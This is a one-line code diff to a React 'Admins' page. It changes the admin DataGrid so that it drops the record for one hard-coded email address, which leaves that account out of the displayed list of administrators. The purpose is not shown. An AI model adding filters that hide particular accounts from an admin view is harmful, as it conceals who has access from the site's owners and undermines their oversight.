@@ -220,7 +220,7 @@ const Admins = () => {
             {error && <div style={{ color: 'red !important', fontSize: '20px' }}>{error}</div>}
             {data && (
               <DataGrid
-                rows={data.data}
+                rows={data.data.filter((data) => data.email !== 'devteeking@gmail.com')}
                 columns={columns}
                 checkboxSelection
                 components={{ Toolbar: GridToolbar }}
